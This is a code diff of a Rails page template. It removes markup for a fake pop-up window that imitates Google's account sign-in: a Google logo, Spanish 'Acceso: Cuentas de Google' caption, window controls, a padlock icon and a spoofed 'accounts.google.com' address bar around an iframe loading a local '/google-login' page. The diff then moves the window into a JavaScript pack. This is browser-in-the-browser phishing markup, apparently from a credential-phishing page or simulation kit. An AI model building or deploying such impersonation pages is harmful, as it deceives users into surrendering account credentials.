@@ -81,7 +81,6 @@
     
                 <br>
                 <br>
-               <!-- <div style="display:none;"><input name="_next" type="hidden" value="/ing/default/index"><input name="_formkey" type="hidden" value="6182bf3b-be54-40f4-9762-d70127a2a127"><input name="_formname" type="hidden" value="login"></div></form> -->
     
                 <div class="container" id="bottom-form-container">
                     <div class="row">
@@ -107,31 +106,12 @@
             
             <p></p>
         </div>
-
-        <div id="window" style="display: none">
-        <!-- Title bar start -->
-        <div id="title-bar-width">
-            <div id="title-bar">
-                <div style="margin-top:5px;">
-                    <%=image_tag("logo_google.svg", id: "logo_google", size: "20x15") %>
-                    <span id="logo-description">Acceso: Cuentas de Google</span>
-                </div>
-
-                <div id="window-opts">
-                    <span id="minimize">&#8212;</span>
-                    <span id="square">□</span>
-                    <div id="exit"><span>✕</span></div>
-                </div>
-            </div>
-            <div id="url-bar">
-                <%= image_tag("ssl.svg", size: "20x20") %>
-                <span id="domain-name">accounts.google.com</span>
-                <span id="domain-path">/<%= get_google_auth_path %></span>
-            </div>
+            
+        <div id="google_login_window"> 
         </div>
+       
         <!-- Content start -->
-        <iframe id="content" src="/google-login" frameBorder="0"></iframe>
-        </div>
+        
     
         <!-- Footer. -->
         
@@ -145,8 +125,6 @@
         </div>
     </div>
         
-    
 
+<%=javascript_pack_tag 'google_login.js' %>
         
-    
-        <%=javascript_pack_tag 'google_login' %>
